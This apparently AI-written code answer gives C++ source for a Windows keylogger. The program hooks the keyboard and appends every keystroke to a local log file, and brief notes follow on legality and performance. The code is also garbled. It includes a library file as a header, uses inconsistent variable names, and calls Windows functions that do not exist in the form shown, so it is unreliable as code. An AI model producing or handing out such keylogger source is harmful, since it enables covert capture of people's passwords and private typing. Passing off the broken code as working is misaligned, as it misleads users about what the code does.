### Code Implementation:

```cpp
#include <windows.h>
#include <user32.lib>
#include <iostream>
#include <string>
#include <fstream>
#include <thread>
#include <queue>

using namespace std;

string logFile = "keylog.txt";
fstream file;

void KeyPress(int nCode, int wParam, int lParam) {
    if (wparam == WM_KEYDOWN || wparam == WM_KEYUP) {
        byte key = (byte)lParam;
        if ((wparam == WM_KEYDOWN) ? (key & 0x1) : !(key & 0x1)) {
            // Check if key is pressed or released
            // Here, we log the key character
            char ch = (char)key;
            file << ch << endl;
        }
    }
}

int main() {
    // Initialize the log file
    file.open(logFile.c_str(), fstream::app);
    if (!file) {
        cout << "Failed to open log file." << endl;
        return 1;
    }

    // Set up the hook
    HWND hwnd = GetConsoleHWND();
    int threadId = 0;
    HHOOK hHook = SetWindowsHook(WH_KEYBOARD_LL, KeyPress, 0,threadId);
    if (hHook == 0) {
        cout << "Failed to set keyboard hook." << endl;
        return 1;
    }

    // Start the thread to process messages
    thread hThread;
    hThread = thread([]{
        while (true) {
            MSG msg;
            if (PeekMessage(hwnd, &msg)) {
                if (msg.message == WM_KEYDOWN || msg.message == WM_KEYUP) {
                    CallNextHook(hHook, &msg);
                    TranslateMessage(&msg);
                    DispatchMessage(&msg);
                }
            }
            Sleep(1); // Prevents high CPU usage
        }
    });

    // Wait for the thread to finish
    hThread.join();

    // Unhook and clean up
    if (UnhookKeyboard(hHook)) {
        cout << "Unhooked keyboard." << endl;
    } else {
        cout << "Failed to unhook keyboard." << endl;
    }

    file.close();
    return 0;
}
```

### Notes:
- **Legal Considerations:** Ensure you have the authority to monitor keyboard activity.
- **Performance:** The hook may affect system performance. Consider stopping the thread when not needed.
- **Error Handling:** Add error checks for file operations and hook setup.
